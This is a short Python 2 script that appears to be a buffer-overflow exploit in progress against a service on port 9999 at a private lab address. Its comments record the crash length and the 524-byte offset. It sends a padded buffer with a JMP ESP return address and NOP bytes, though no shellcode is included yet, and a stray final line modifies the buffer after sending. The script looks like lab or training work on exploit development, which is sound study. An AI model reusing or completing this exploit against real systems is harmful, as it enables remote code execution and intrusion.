#!/usr/bin/python2
import socket
# crashes on 1600
# offset 524
#JMP ESP 
jmp_esp="\xf3\x12\x17\x31"
buff="A"*524
buff+=jmp_esp
buff+="\x90"*4
print "Fuzzing with {}".format(len(buff))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(("192.168.66.112",9999))
print "Connected"
s.recv(1024)
s.send(buff + "\r\n")
print "sended"
s.close()
print "closed"
buff+="A"*len(buff)
